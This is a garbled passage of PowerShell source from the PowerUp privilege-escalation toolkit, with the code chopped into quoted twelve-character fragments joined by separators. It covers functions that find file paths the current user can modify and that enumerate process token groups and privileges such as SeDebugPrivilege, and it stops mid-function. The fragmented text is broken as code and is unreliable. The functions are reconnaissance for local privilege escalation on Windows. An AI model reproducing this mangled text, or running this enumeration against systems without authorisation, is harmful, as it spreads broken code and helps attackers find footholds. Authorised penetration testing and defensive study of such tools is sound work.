      ','      [uint3','2]''0x0000000','8'' = ''ReadEx','tendedAttrib','utes''
      ','      [uint3','2]''0x0000000','4'' = ''Append','Data/AddSubd','irectory''
  ','          [u','int32]''0x000','00002'' = ''Wr','iteData/AddF','ile''
       ','     [uint32',']''0x00000001',''' = ''ReadDat','a/ListDirect','ory''
       ',' }

        ','$UserIdentit','y = [System.','Security.Pri','ncipal.Windo','wsIdentity]:',':GetCurrent(',')
        $C','urrentUserSi','ds = $UserId','entity.Group','s | Select-O','bject -Expan','dProperty Va','lue
        ','$CurrentUser','Sids += $Use','rIdentity.Us','er.Value
   ','     $Transl','atedIdentity','References =',' @{}
    }

','    PROCESS ','{

        F','orEach($Targ','etPath in $P','ath) {

    ','        $Can','didatePaths ','= @()

     ','       # pos','sible separa','tor characte','r combinatio','ns
         ','   $Separati','onCharacterS','ets = @(''"'',',' "''", '' '', "','`"''", ''" '', ','"'' ", "`"'' "',')

         ','   if ($PSBo','undParameter','s[''Literal'']',') {

       ','         $Te','mpPath = $([','System.Envir','onment]::Exp','andEnvironme','ntVariables(','$TargetPath)',')

         ','       if (T','est-Path -Pa','th $TempPath',' -ErrorActio','n SilentlyCo','ntinue) {
  ','            ','      $Candi','datePaths +=',' Resolve-Pat','h -Path $Tem','pPath | Sele','ct-Object -E','xpandPropert','y Path
     ','           }','
           ','     else {
','            ','        # if',' the path do','esn''t exist,',' check if th','e parent fol','der allows f','or modificat','ion
        ','            ','$ParentPath ','= Split-Path',' -Path $Temp','Path -Parent','  -ErrorActi','on SilentlyC','ontinue
    ','            ','    if ($Par','entPath -and',' (Test-Path ','-Path $Paren','tPath)) {
  ','            ','          $C','andidatePath','s += Resolve','-Path -Path ','$ParentPath ','-ErrorAction',' SilentlyCon','tinue | Sele','ct-Object -E','xpandPropert','y Path
     ','            ','   }
       ','         }
 ','           }','
           ',' else {
    ','            ','ForEach($Sep','arationChara','cterSet in $','SeparationCh','aracterSets)',' {
         ','           $','TargetPath.S','plit($Separa','tionCharacte','rSet) | Wher','e-Object {$_',' -and ($_.tr','im() -ne '''')','} | ForEach-','Object {

  ','            ','          if',' (($Separati','onCharacterS','et -notmatch',' '' '')) {

  ','            ','            ','  $TempPath ','= $([System.','Environment]','::ExpandEnvi','ronmentVaria','bles($_)).Tr','im()

      ','            ','          if',' ($TempPath ','-and ($TempP','ath -ne ''''))',' {
         ','            ','           i','f (Test-Path',' -Path $Temp','Path -ErrorA','ction Silent','lyContinue) ','{
          ','            ','            ','  # if the p','ath exists, ','resolve it a','nd add it to',' the candida','te list
    ','            ','            ','        $Can','didatePaths ','+= Resolve-P','ath -Path $T','empPath | Se','lect-Object ','-ExpandPrope','rty Path
   ','            ','            ','     }

    ','            ','            ','    else {
 ','            ','            ','           #',' if the path',' doesn''t exi','st, check if',' the parent ','folder allow','s for modifi','cation
     ','            ','            ','       try {','
           ','            ','            ','     $Parent','Path = (Spli','t-Path -Path',' $TempPath -','Parent -Erro','rAction Sile','ntlyContinue',').Trim()
   ','            ','            ','            ',' if ($Parent','Path -and ($','ParentPath -','ne '''') -and ','(Test-Path -','Path $Parent','Path  -Error','Action Silen','tlyContinue)',') {
        ','            ','            ','            ','$CandidatePa','ths += Resol','ve-Path -Pat','h $ParentPat','h -ErrorActi','on SilentlyC','ontinue | Se','lect-Object ','-ExpandPrope','rty Path
   ','            ','            ','            ',' }
         ','            ','            ','   }
       ','            ','            ','     catch {','}
          ','            ','          }
','            ','            ','    }
      ','            ','      }
    ','            ','        else',' {
         ','            ','       # if ','the separato','r contains a',' space
     ','            ','           $','CandidatePat','hs += Resolv','e-Path -Path',' $([System.E','nvironment]:',':ExpandEnvir','onmentVariab','les($_)) -Er','rorAction Si','lentlyContin','ue | Select-','Object -Expa','ndProperty P','ath | ForEac','h-Object {$_','.Trim()} | W','here-Object ','{($_ -ne '''')',' -and (Test-','Path -Path $','_)}
        ','            ','    }
      ','            ','  }
        ','        }
  ','          }
','
           ',' $CandidateP','aths | Sort-','Object -Uniq','ue | ForEach','-Object {
  ','            ','  $Candidate','Path = $_
  ','            ','  Get-Acl -P','ath $Candida','tePath | Sel','ect-Object -','ExpandProper','ty Access | ','Where-Object',' {($_.Access','ControlType ','-match ''Allo','w'')} | ForEa','ch-Object {
','
           ','         $Fi','leSystemRigh','ts = $_.File','SystemRights','.value__

  ','            ','      $Permi','ssions = $Ac','cessMask.Key','s | Where-Ob','ject { $File','SystemRights',' -band $_ } ','| ForEach-Ob','ject { $Acce','ssMask[$_] }','

          ','          # ','the set of p','ermission ty','pes that all','ow for modif','ication
    ','            ','    $Compari','son = Compar','e-Object -Re','ferenceObjec','t $Permissio','ns -Differen','ceObject @(''','GenericWrite',''', ''GenericA','ll'', ''Maximu','mAllowed'', ''','WriteOwner'',',' ''WriteDAC'',',' ''WriteData/','AddFile'', ''A','ppendData/Ad','dSubdirector','y'') -Include','Equal -Exclu','deDifferent
','
           ','         if ','($Comparison',') {
        ','            ','    if ($_.I','dentityRefer','ence -notmat','ch ''^S-1-5.*',''') {
       ','            ','         if ','(-not ($Tran','slatedIdenti','tyReferences','[$_.Identity','Reference]))',' {
         ','            ','           #',' translate t','he IdentityR','eference if ','it''s a usern','ame and not ','a SID
      ','            ','            ','  $IdentityU','ser = New-Ob','ject System.','Security.Pri','ncipal.NTAcc','ount($_.Iden','tityReferenc','e)
         ','            ','           $','TranslatedId','entityRefere','nces[$_.Iden','tityReferenc','e] = $Identi','tyUser.Trans','late([System','.Security.Pr','incipal.Secu','rityIdentifi','er]) | Selec','t-Object -Ex','pandProperty',' Value
     ','            ','           }','
           ','            ','     $Identi','tySID = $Tra','nslatedIdent','ityReference','s[$_.Identit','yReference]
','            ','            ','}
          ','            ','  else {
   ','            ','            ',' $IdentitySI','D = $_.Ident','ityReference','
           ','            ',' }

        ','            ','    if ($Cur','rentUserSids',' -contains $','IdentitySID)',' {
         ','            ','       $Out ','= New-Object',' PSObject
  ','            ','            ','  $Out | Add','-Member Note','property ''Mo','difiablePath',''' $Candidate','Path
       ','            ','         $Ou','t | Add-Memb','er Noteprope','rty ''Identit','yReference'' ','$_.IdentityR','eference
   ','            ','            ',' $Out | Add-','Member Notep','roperty ''Per','missions'' $P','ermissions
 ','            ','            ','   $Out.PSOb','ject.TypeNam','es.Insert(0,',' ''PowerUp.Mo','difiablePath',''')
         ','            ','       $Out
','            ','            ','}
          ','          }
','            ','    }
      ','      }
    ','    }
    }
','}


function',' Get-TokenIn','formation {
','<#
.SYNOPSIS','

Helpers th','at returns t','oken groups ','or privilege','s for a pass','ed process/t','hread token.','
Used by Get','-ProcessToke','nGroup and G','et-ProcessTo','kenPrivilege','.

Author: W','ill Schroede','r (@harmj0y)','  
License: ','BSD 3-Clause','  
Required ','Dependencies',': PSReflect ',' 

.DESCRIPT','ION

Wraps t','he GetTokenI','nformation()',' Win 32API c','all to query',' the given t','oken for
eit','her token gr','oups (-Infor','mationClass ','"Groups") or',' privileges ','(-Informatio','nClass "Priv','ileges").
Fo','r token grou','ps, group is',' iterated th','rough and th','e SID struct','ure is conve','rted to a re','adable
strin','g using Conv','ertSidToStri','ngSid(), and',' the unique ','list of SIDs',' the user is',' a part of
(','disabled or ','not) is retu','rned as a st','ring array.
','
.PARAMETER ','TokenHandle
','
The IntPtr ','token handle',' to query. R','equired.

.P','ARAMETER Inf','ormationClas','s

The type ','of informati','on to query ','for the toke','n handle, ei','ther ''Groups',''', ''Privileg','es'', or ''Typ','e''.

.OUTPUT','S

PowerUp.T','okenGroup

O','utputs a cus','tom object c','ontaining th','e token grou','p (SID/attri','butes) for t','he specified',' token if
"-','InformationC','lass ''Groups','''" is passed','.

PowerUp.T','okenPrivileg','e

Outputs a',' custom obje','ct containin','g the token ','privilege (n','ame/attribut','es) for the ','specified to','ken if
"-Inf','ormationClas','s ''Privilege','s''" is passe','d

PowerUp.T','okenType

Ou','tputs a cust','om object co','ntaining the',' token type ','and imperson','ation level ','for the spec','ified token ','if
"-Informa','tionClass ''T','ype''" is pas','sed

.LINK

','https://msdn','.microsoft.c','om/en-us/lib','rary/windows','/desktop/aa4','46671(v=vs.8','5).aspx
http','s://msdn.mic','rosoft.com/e','n-us/library','/windows/des','ktop/aa37962','4(v=vs.85).a','spx
https://','msdn.microso','ft.com/en-us','/library/win','dows/desktop','/aa379554(v=','vs.85).aspx
','https://msdn','.microsoft.c','om/en-us/lib','rary/windows','/desktop/aa3','79626(v=vs.8','5).aspx
http','s://msdn.mic','rosoft.com/e','n-us/library','/windows/des','ktop/aa37963','0(v=vs.85).a','spx
#>

    ','[OutputType(','''PowerUp.Tok','enGroup'')]
 ','   [OutputTy','pe(''PowerUp.','TokenPrivile','ge'')]
    [C','mdletBinding','()]
    Para','m(
        [','Parameter(Po','sition = 0, ','Mandatory = ','$True, Value','FromPipeline',' = $True)]
 ','       [Alia','s(''hToken'', ','''Token'')]
  ','      [Valid','ateNotNullOr','Empty()]
   ','     [IntPtr',']
        $T','okenHandle,
','
        [St','ring[]]
    ','    [Validat','eSet(''Groups',''', ''Privileg','es'', ''Type'')',']
        $I','nformationCl','ass = ''Privi','leges''
    )','

    PROCES','S {
        ','if ($Informa','tionClass -e','q ''Groups'') ','{
          ','  # query th','e process to','ken with the',' TOKEN_INFOR','MATION_CLASS',' = 2 enum to',' retrieve a ','TOKEN_GROUPS',' structure

','            ','# initial qu','ery to deter','mine the nec','essary buffe','r size
     ','       $Toke','nGroupsPtrSi','ze = 0
     ','       $Succ','ess = $Advap','i32::GetToke','nInformation','($TokenHandl','e, 2, 0, $To','kenGroupsPtr','Size, [ref]$','TokenGroupsP','trSize)
    ','        [Int','Ptr]$TokenGr','oupsPtr = [S','ystem.Runtim','e.InteropSer','vices.Marsha','l]::AllocHGl','obal($TokenG','roupsPtrSize',')

         ','   $Success ','= $Advapi32:',':GetTokenInf','ormation($To','kenHandle, 2',', $TokenGrou','psPtr, $Toke','nGroupsPtrSi','ze, [ref]$To','kenGroupsPtr','Size);$LastE','rror = [Runt','ime.InteropS','ervices.Mars','hal]::GetLas','tWin32Error(',')

         ','   if ($Succ','ess) {
     ','           $','TokenGroups ','= $TokenGrou','psPtr -as $T','OKEN_GROUPS
','            ','    For ($i=','0; $i -lt $T','okenGroups.G','roupCount; $','i++) {
     ','            ','   # convert',' each token ','group SID to',' a displayab','le string

 ','            ','       if ($','TokenGroups.','Groups[$i].S','ID) {
      ','            ','      $SidSt','ring = ''''
  ','            ','          $R','esult = $Adv','api32::Conve','rtSidToStrin','gSid($TokenG','roups.Groups','[$i].SID, [r','ef]$SidStrin','g);$LastErro','r = [Runtime','.InteropServ','ices.Marshal',']::GetLastWi','n32Error()
 ','            ','           i','f ($Result -','eq 0) {
    ','            ','            ','Write-Verbos','e "Error: $(','([ComponentM','odel.Win32Ex','ception] $La','stError).Mes','sage)"
     ','            ','       }
   ','            ','         els','e {
        ','            ','        $Gro','upSid = New-','Object PSObj','ect
        ','            ','        $Gro','upSid | Add-','Member Notep','roperty ''SID',''' $SidString','
           ','            ','     # cast ','the atttribu','tes field as',' our SidAttr','ibutes enum
','            ','            ','    $GroupSi','d | Add-Memb','er Noteprope','rty ''Attribu','tes'' ($Token','Groups.Group','s[$i].Attrib','utes -as $Si','dAttributes)','
           ','            ','     $GroupS','id | Add-Mem','ber Noteprop','erty ''TokenH','andle'' $Toke','nHandle
    ','            ','            ','$GroupSid.PS','Object.TypeN','ames.Insert(','0, ''PowerUp.','TokenGroup'')','
           ','            ','     $GroupS','id
         ','            ','   }
       ','            ',' }
         ','       }
   ','         }
 ','           e','lse {
      ','          Wr','ite-Warning ','([ComponentM','odel.Win32Ex','ception] $La','stError)
   ','         }
 ','           [','System.Runti','me.InteropSe','rvices.Marsh','al]::FreeHGl','obal($TokenG','roupsPtr)
  ','      }
    ','    elseif (','$Information','Class -eq ''P','rivileges'') ','{
          ','  # query th','e process to','ken with the',' TOKEN_INFOR','MATION_CLASS',' = 3 enum to',' retrieve a ','TOKEN_PRIVIL','EGES structu','re

        ','    # initia','l query to d','etermine the',' necessary b','uffer size
 ','           $','TokenPrivile','gesPtrSize =',' 0
         ','   $Success ','= $Advapi32:',':GetTokenInf','ormation($To','kenHandle, 3',', 0, $TokenP','rivilegesPtr','Size, [ref]$','TokenPrivile','gesPtrSize)
','            ','[IntPtr]$Tok','enPrivileges','Ptr = [Syste','m.Runtime.In','teropService','s.Marshal]::','AllocHGlobal','($TokenPrivi','legesPtrSize',')

         ','   $Success ','= $Advapi32:',':GetTokenInf','ormation($To','kenHandle, 3',', $TokenPriv','ilegesPtr, $','TokenPrivile','gesPtrSize, ','[ref]$TokenP','rivilegesPtr','Size);$LastE','rror = [Runt','ime.InteropS','ervices.Mars','hal]::GetLas','tWin32Error(',')

         ','   if ($Succ','ess) {
     ','           $','TokenPrivile','ges = $Token','PrivilegesPt','r -as $TOKEN','_PRIVILEGES
','            ','    For ($i=','0; $i -lt $T','okenPrivileg','es.Privilege','Count; $i++)',' {
         ','           $','Privilege = ','New-Object P','SObject
    ','            ','    $Privile','ge | Add-Mem','ber Noteprop','erty ''Privil','ege'' $TokenP','rivileges.Pr','ivileges[$i]','.Luid.LowPar','t.ToString()','
           ','         # c','ast the lowe','r Luid field',' as our Luid','Attributes e','num
        ','            ','$Privilege |',' Add-Member ','Noteproperty',' ''Attributes',''' ($TokenPri','vileges.Priv','ileges[$i].A','ttributes -a','s $LuidAttri','butes)
     ','            ','   $Privileg','e | Add-Memb','er Noteprope','rty ''TokenHa','ndle'' $Token','Handle
     ','            ','   $Privileg','e.PSObject.T','ypeNames.Ins','ert(0, ''Powe','rUp.TokenPri','vilege'')
   ','            ','     $Privil','ege
        ','        }
  ','          }
','            ','else {
     ','           W','rite-Warning',' ([Component','Model.Win32E','xception] $L','astError)
  ','          }
','            ','[System.Runt','ime.InteropS','ervices.Mars','hal]::FreeHG','lobal($Token','PrivilegesPt','r)
        }','
        els','e {
        ','    $TokenRe','sult = New-O','bject PSObje','ct

        ','    # query ','the process ','token with t','he TOKEN_INF','ORMATION_CLA','SS = 8 enum ','to retrieve ','a TOKEN_TYPE',' enum

     ','       # ini','tial query t','o determine ','the necessar','y buffer siz','e
          ','  $TokenType','PtrSize = 0
','            ','$Success = $','Advapi32::Ge','tTokenInform','ation($Token','Handle, 8, 0',', $TokenType','PtrSize, [re','f]$TokenType','PtrSize)
   ','         [In','tPtr]$TokenT','ypePtr = [Sy','stem.Runtime','.InteropServ','ices.Marshal',']::AllocHGlo','bal($TokenTy','pePtrSize)

','            ','$Success = $','Advapi32::Ge','tTokenInform','ation($Token','Handle, 8, $','TokenTypePtr',', $TokenType','PtrSize, [re','f]$TokenType','PtrSize);$La','stError = [R','untime.Inter','opServices.M','arshal]::Get','LastWin32Err','or()

      ','      if ($S','uccess) {
  ','            ','  $Temp = $T','okenTypePtr ','-as $TOKEN_T','YPE
        ','        $Tok','enResult | A','dd-Member No','teproperty ''','Type'' $Temp.','Type
       ','     }
     ','       else ','{
          ','      Write-','Warning ([Co','mponentModel','.Win32Except','ion] $LastEr','ror)
       ','     }
     ','       [Syst','em.Runtime.I','nteropServic','es.Marshal]:',':FreeHGlobal','($TokenTypeP','tr)

       ','     # now q','uery the pro','cess token w','ith the TOKE','N_INFORMATIO','N_CLASS = 8 ','enum to retr','ieve a SECUR','ITY_IMPERSON','ATION_LEVEL ','enum

      ','      # init','ial query to',' determine t','he necessary',' buffer size','
           ',' $TokenImper','sonationLeve','lPtrSize = 0','
           ',' $Success = ','$Advapi32::G','etTokenInfor','mation($Toke','nHandle, 8, ','0, $TokenImp','ersonationLe','velPtrSize, ','[ref]$TokenI','mpersonation','LevelPtrSize',')
          ','  [IntPtr]$T','okenImperson','ationLevelPt','r = [System.','Runtime.Inte','ropServices.','Marshal]::Al','locHGlobal($','TokenImperso','nationLevelP','trSize)

   ','         $Su','ccess2 = $Ad','vapi32::GetT','okenInformat','ion($TokenHa','ndle, 8, $To','kenImpersona','tionLevelPtr',', $TokenImpe','rsonationLev','elPtrSize, [','ref]$TokenIm','personationL','evelPtrSize)',';$LastError ','= [Runtime.I','nteropServic','es.Marshal]:',':GetLastWin3','2Error()

  ','          if',' ($Success2)',' {
         ','       $Temp',' = $TokenImp','ersonationLe','velPtr -as $','IMPERSONATIO','N_LEVEL
    ','            ','$TokenResult',' | Add-Membe','r Noteproper','ty ''Imperson','ationLevel'' ','$Temp.Impers','onationLevel','
           ','     $TokenR','esult | Add-','Member Notep','roperty ''Tok','enHandle'' $T','okenHandle
 ','            ','   $TokenRes','ult.PSObject','.TypeNames.I','nsert(0, ''Po','werUp.TokenT','ype'')
      ','          $T','okenResult
 ','           }','
           ',' else {
    ','            ','Write-Warnin','g ([Componen','tModel.Win32','Exception] $','LastError)
 ','           }','
           ',' [System.Run','time.Interop','Services.Mar','shal]::FreeH','Global($Toke','nImpersonati','onLevelPtr)
','        }
  ','  }
}


func','tion Get-Pro','cessTokenGro','up {
<#
.SYN','OPSIS

Retur','ns all SIDs ','that the cur','rent token c','ontext is a ','part of, whe','ther they ar','e disabled o','r not.

Auth','or: Will Sch','roeder (@har','mj0y)  
Lice','nse: BSD 3-C','lause  
Requ','ired Depende','ncies: PSRef','lect, Get-To','kenInformati','on  

.DESCR','IPTION

Firs','t, if a proc','ess ID is pa','ssed, then t','he process i','s opened usi','ng OpenProce','ss(),
otherw','ise GetCurre','ntProcess() ','is used to o','pen up a pse','udohandle to',' the current',' process.
Op','enProcessTok','en() is then',' used to get',' a handle to',' the specifi','ed process t','oken. The to','ken
is then ','passed to Ge','t-TokenInfor','mation to qu','ery the curr','ent token gr','oups for the',' specified
t','oken.

.PARA','METER Id

Th','e process ID',' to enumerat','e token grou','ps for, othe','rwise defaul','ts to the cu','rrent proces','s.

.EXAMPLE','

Get-Proces','sTokenGroup
','
SID        ','            ','      Attrib','utes        ',' TokenHandle','           P','rocessId
---','            ','            ','  ----------','         ---','--------    ','       -----','----
S-1-5-2','1-8901718...',' ...SE_GROUP','_ENABLED    ','            ','1616        ','        3684','
S-1-1-0    ','         ...','SE_GROUP_ENA','BLED        ','        1616','            ','    3684
S-1','-5-32-544   ','     ..., SE','_GROUP_OWNER','            ','    1616    ','            ','3684
S-1-5-3','2-545       ',' ...SE_GROUP','_ENABLED    ','            ','1616        ','        3684','
S-1-5-4    ','         ...','SE_GROUP_ENA','BLED        ','        1616','            ','    3684
S-1','-2-1        ','     ...SE_G','ROUP_ENABLED','            ','    1616    ','            ','3684
S-1-5-1','1           ',' ...SE_GROUP','_ENABLED    ','            ','1616        ','        3684','
S-1-5-15   ','         ...','SE_GROUP_ENA','BLED        ','        1616','            ','    3684
S-1','-5-5-0-10534','59   ...NTEG','RITY_ENABLED','            ','    1616    ','            ','3684
S-1-2-0','            ',' ...SE_GROUP','_ENABLED    ','            ','1616        ','        3684','
S-1-18-1   ','         ...','SE_GROUP_ENA','BLED        ','        1616','            ','    3684
S-1','-16-12288   ','            ','            ','            ','    1616    ','            ','3684

.EXAMP','LE

Get-Proc','ess notepad ','| Get-Proces','sTokenGroup
','
SID        ','            ','      Attrib','utes        ',' TokenHandle','           P','rocessId
---','            ','            ','  ----------','         ---','--------    ','       -----','----
S-1-5-2','1-8901718...',' ...SE_GROUP','_ENABLED    ','            ','1892        ','        2044','
S-1-1-0    ','         ...','SE_GROUP_ENA','BLED        ','        1892','            ','    2044
S-1','-5-32-544   ','     ...SE_F','OR_DENY_ONLY','            ','    1892    ','            ','2044
S-1-5-3','2-545       ',' ...SE_GROUP','_ENABLED    ','            ','1892        ','        2044','
S-1-5-4    ','         ...','SE_GROUP_ENA','BLED        ','        1892','            ','    2044
S-1','-2-1        ','     ...SE_G','ROUP_ENABLED','            ','    1892    ','            ','2044
S-1-5-1','1           ',' ...SE_GROUP','_ENABLED    ','            ','1892        ','        2044','
S-1-5-15   ','         ...','SE_GROUP_ENA','BLED        ','        1892','            ','    2044
S-1','-5-5-0-10534','59   ...NTEG','RITY_ENABLED','            ','    1892    ','            ','2044
S-1-2-0','            ',' ...SE_GROUP','_ENABLED    ','            ','1892        ','        2044','
S-1-18-1   ','         ...','SE_GROUP_ENA','BLED        ','        1892','            ','    2044
S-1','-16-8192    ','            ','            ','            ','    1892    ','            ','2044


.OUTP','UTS

PowerUp','.TokenGroup
','
Outputs a c','ustom object',' containing ','the token gr','oup (SID/att','ributes) for',' the specifi','ed process.
','#>

    [Dia','gnostics.Cod','eAnalysis.Su','ppressMessag','eAttribute(''','PSShouldProc','ess'', '''')]
 ','   [OutputTy','pe(''PowerUp.','TokenGroup'')',']
    [Cmdle','tBinding()]
','    Param(
 ','       [Para','meter(Positi','on = 0, Valu','eFromPipelin','e = $True, V','alueFromPipe','lineByProper','tyName = $Tr','ue)]
       ',' [Alias(''Pro','cessID'')]
  ','      [UInt3','2]
        [','ValidateNotN','ullOrEmpty()',']
        $I','d
    )

   ',' PROCESS {
 ','       if ($','PSBoundParam','eters[''Id''])',' {
         ','   $ProcessH','andle = $Ker','nel32::OpenP','rocess(0x400',', $False, $I','d);$LastErro','r = [Runtime','.InteropServ','ices.Marshal',']::GetLastWi','n32Error()
 ','           i','f ($ProcessH','andle -eq 0)',' {
         ','       Write','-Warning ([C','omponentMode','l.Win32Excep','tion] $LastE','rror)
      ','      }
    ','        else',' {
         ','       $Proc','essID = $Id
','            ','}
        }
','        else',' {
         ','   # open up',' a pseudo ha','ndle to the ','current proc','ess- don''t n','eed to worry',' about closi','ng
         ','   $ProcessH','andle = $Ker','nel32::GetCu','rrentProcess','()
         ','   $ProcessI','D = $PID
   ','     }

    ','    if ($Pro','cessHandle) ','{
          ','  [IntPtr]$h','ProcToken = ','[IntPtr]::Ze','ro
         ','   $TOKEN_QU','ERY = 0x0008','
           ',' $Success = ','$Advapi32::O','penProcessTo','ken($Process','Handle, $TOK','EN_QUERY, [r','ef]$hProcTok','en);$LastErr','or = [Runtim','e.InteropSer','vices.Marsha','l]::GetLastW','in32Error()
','
           ',' if ($Succes','s) {
       ','         $To','kenGroups = ','Get-TokenInf','ormation -To','kenHandle $h','ProcToken -I','nformationCl','ass ''Groups''','
           ','     $TokenG','roups | ForE','ach-Object {','
           ','         $_ ','| Add-Member',' Notepropert','y ''ProcessId',''' $ProcessID','
           ','         $_
','            ','    }
      ','      }
    ','        else',' {
         ','       Write','-Warning ([C','omponentMode','l.Win32Excep','tion] $LastE','rror)
      ','      }

   ','         if ','($PSBoundPar','ameters[''Id''',']) {
       ','         # c','lose the han','dle if we us','ed OpenProce','ss()
       ','         $Nu','ll = $Kernel','32::CloseHan','dle($Process','Handle)
    ','        }
  ','      }
    ','}
}


functi','on Get-Proce','ssTokenPrivi','lege {
<#
.S','YNOPSIS

Ret','urns all pri','vileges for ','the current ','(or specifie','d) process I','D.

Author: ','Will Schroed','er (@harmj0y',')  
License:',' BSD 3-Claus','e  
Required',' Dependencie','s: PSReflect',', Get-TokenI','nformation  ','

.DESCRIPTI','ON

First, i','f a process ','ID is passed',', then the p','rocess is op','ened using O','penProcess()',',
otherwise ','GetCurrentPr','ocess() is u','sed to open ','up a pseudoh','andle to the',' current pro','cess.
OpenPr','ocessToken()',' is then use','d to get a h','andle to the',' specified p','rocess token','. The token
','is then pass','ed to Get-To','kenInformati','on to query ','the current ','privileges f','or the speci','fied
token.
','
.PARAMETER ','Id

The proc','ess ID to en','umerate toke','n groups for',', otherwise ','defaults to ','the current ','process.

.P','ARAMETER Spe','cial

Switch','. Only retur','n ''special'' ','privileges, ','meaning admi','n-level priv','ileges.
Thes','e include Se','SecurityPriv','ilege, SeTak','eOwnershipPr','ivilege, SeL','oadDriverPri','vilege, SeBa','ckupPrivileg','e,
SeRestore','Privilege, S','eDebugPrivil','ege, SeSyste','mEnvironment','Privilege, S','eImpersonate','Privilege, S','eTcbPrivileg','e.

.EXAMPLE','

Get-Proces','sTokenPrivil','ege | ft -a
','
WARNING: 2 ','columns do n','ot fit into ','the display ','and were rem','oved.

Privi','lege        ','            ','            ','            ','            ','    Attribut','es
---------','            ','            ','            ','            ','            ','----------
S','eUnsolicited','InputPrivile','ge          ','            ','            ','          DI','SABLED
SeTcb','Privilege   ','            ','            ','            ','            ','      DISABL','ED
SeSecurit','yPrivilege  ','            ','            ','            ','            ','  DISABLED
S','eTakeOwnersh','ipPrivilege ','            ','            ','            ','          DI','SABLED
SeLoa','dDriverPrivi','lege        ','            ','            ','            ','      DISABL','ED
SeSystemP','rofilePrivil','ege         ','            ','            ','            ','  DISABLED
S','eSystemtimeP','rivilege    ','            ','            ','            ','          DI','SABLED
SePro','fileSinglePr','ocessPrivile','ge          ','            ','            ','      DISABL','ED
SeIncreas','eBasePriorit','yPrivilege  ','            ','            ','            ','  DISABLED
S','eCreatePagef','ilePrivilege','            ','            ','            ','          DI','SABLED
SeBac','kupPrivilege','            ','            ','            ','            ','      DISABL','ED
SeRestore','Privilege   ','            ','            ','            ','            ','  DISABLED
S','eShutdownPri','vilege      ','            ','            ','            ','          DI','SABLED
SeDeb','ugPrivilege ','            ','            ','            ','      SE_PRI','VILEGE_ENABL','ED
SeSystemE','nvironmentPr','ivilege     ','            ','            ','            ','  DISABLED
S','eChangeNotif','yPrivilege  ','       ...EG','E_ENABLED_BY','_DEFAULT, SE','_PRIVILEGE_E','NABLED
SeRem','oteShutdownP','rivilege    ','            ','            ','            ','      DISABL','ED
SeUndockP','rivilege    ','            ','            ','            ','            ','  DISABLED
S','eManageVolum','ePrivilege  ','            ','            ','            ','          DI','SABLED
SeImp','ersonatePriv','ilege       ','   ...EGE_EN','ABLED_BY_DEF','AULT, SE_PRI','VILEGE_ENABL','ED
SeCreateG','lobalPrivile','ge         .','..EGE_ENABLE','D_BY_DEFAULT',', SE_PRIVILE','GE_ENABLED
S','eIncreaseWor','kingSetPrivi','lege        ','            ','            ','          DI','SABLED
SeTim','eZonePrivile','ge          ','            ','            ','            ','      DISABL','ED
SeCreateS','ymbolicLinkP','rivilege    ','            ','            ','            ','  DISABLED

','.EXAMPLE

Ge','t-ProcessTok','enPrivilege ','-Special

Pr','ivilege     ','            ','   Attribute','s         To','kenHandle   ','        Proc','essId
------','---         ','           -','---------   ','      ------','-----       ','    --------','-
SeTcbPrivi','lege        ','         DIS','ABLED       ','         226','8           ','     3684
Se','SecurityPriv','ilege       ','     DISABLE','D           ','     2268   ','            ',' 3684
SeTake','OwnershipP..','.           ',' DISABLED   ','            ',' 2268       ','         368','4
SeLoadDriv','erPriv...   ','         DIS','ABLED       ','         226','8           ','     3684
Se','BackupPrivil','ege         ','     DISABLE','D           ','     2268   ','            ',' 3684
SeRest','orePrivilege','            ',' DISABLED   ','            ',' 2268       ','         368','4
SeDebugPri','vilege    ..','.RIVILEGE_EN','ABLED       ','         226','8           ','     3684
Se','SystemEnviro','nm...       ','     DISABLE','D           ','     2268   ','            ',' 3684
SeImpe','rsonatePri..','. ...RIVILEG','E_ENABLED   ','            ',' 2268       ','         368','4

.EXAMPLE
','
Get-Process',' notepad | G','et-ProcessTo','kenPrivilege',' | fl

Privi','lege   : SeS','hutdownPrivi','lege
Attribu','tes  : DISAB','LED
TokenHan','dle : 2164
P','rocessId   :',' 2044

Privi','lege   : SeC','hangeNotifyP','rivilege
Att','ributes  : S','E_PRIVILEGE_','ENABLED_BY_D','EFAULT, SE_P','RIVILEGE_ENA','BLED
TokenHa','ndle : 2164
','ProcessId   ',': 2044

Priv','ilege   : Se','UndockPrivil','ege
Attribut','es  : DISABL','ED
TokenHand','le : 2164
Pr','ocessId   : ','2044

Privil','ege   : SeIn','creaseWorkin','gSetPrivileg','e
Attributes','  : DISABLED','
TokenHandle',' : 2164
Proc','essId   : 20','44

Privileg','e   : SeTime','ZonePrivileg','e
Attributes','  : DISABLED','
TokenHandle',' : 2164
Proc','essId   : 20','44

.OUTPUTS','

PowerUp.To','kenPrivilege','

Outputs a ','custom objec','t containing',' the token p','rivilege (na','me/attribute','s) for the s','pecified pro','cess.
#>

  ','  [Diagnosti','cs.CodeAnaly','sis.Suppress','MessageAttri','bute(''PSShou','ldProcess'', ',''''')]
    [Ou','tputType(''Po','werUp.TokenP','rivilege'')]
','    [CmdletB','inding()]
  ','  Param(
   ','     [Parame','ter(Position',' = 0, ValueF','romPipeline ','= $True, Val','ueFromPipeli','neByProperty','Name = $True',')]
        [','Alias(''Proce','ssID'')]
    ','    [UInt32]','
        [Va','lidateNotNul','lOrEmpty()]
','        $Id,','

        [S','witch]
     ','   [Alias(''P','rivileged'')]','
        $Sp','ecial
    )
','
    BEGIN {','
        $Sp','ecialPrivile','ges = @(''SeS','ecurityPrivi','lege'', ''SeTa','keOwnershipP','rivilege'', ''','SeLoadDriver','Privilege'', ','''SeBackupPri','vilege'', ''Se','RestorePrivi','lege'', ''SeDe','bugPrivilege',''', ''SeSystem','EnvironmentP','rivilege'', ''','SeImpersonat','ePrivilege'',',' ''SeTcbPrivi','lege'')
    }','

    PROCES','S {
        ','if ($PSBound','Parameters[''','Id'']) {
    ','        $Pro','cessHandle =',' $Kernel32::','OpenProcess(','0x400, $Fals','e, $Id);$Las','tError = [Ru','ntime.Intero','pServices.Ma','rshal]::GetL','astWin32Erro','r()
        ','    if ($Pro','cessHandle -','eq 0) {
    ','            ','Write-Warnin','g ([Componen','tModel.Win32','Exception] $','LastError)
 ','           }','
           ',' else {
    ','            ','$ProcessID =',' $Id
       ','     }
     ','   }
       ',' else {
    ','        # op','en up a pseu','do handle to',' the current',' process- do','n''t need to ','worry about ','closing
    ','        $Pro','cessHandle =',' $Kernel32::','GetCurrentPr','ocess()
    ','        $Pro','cessID = $PI','D
        }
','
        if ','($ProcessHan','dle) {
     ','       [IntP','tr]$hProcTok','en = [IntPtr',']::Zero
